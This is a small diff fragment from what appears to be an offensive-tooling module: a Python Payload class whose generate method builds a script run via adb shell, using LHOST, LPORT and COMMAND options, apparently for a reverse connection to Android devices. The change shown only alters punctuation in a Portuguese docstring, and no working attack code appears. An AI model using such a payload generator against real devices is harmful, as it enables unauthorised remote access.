@@ -61,7 +61,7 @@ class Payload(BasePayload):
         return cmd, arg0, arg1, data
 
     def generate(self) -> bytes:
-        """Gera script de payload — executa via adb shell."""
+        """Gera script de payload  -  executa via adb shell."""
         lhost = self.options["LHOST"]["value"]
         lport = self.options["LPORT"]["value"]
         cmd = self.options["COMMAND"]["value"] or (
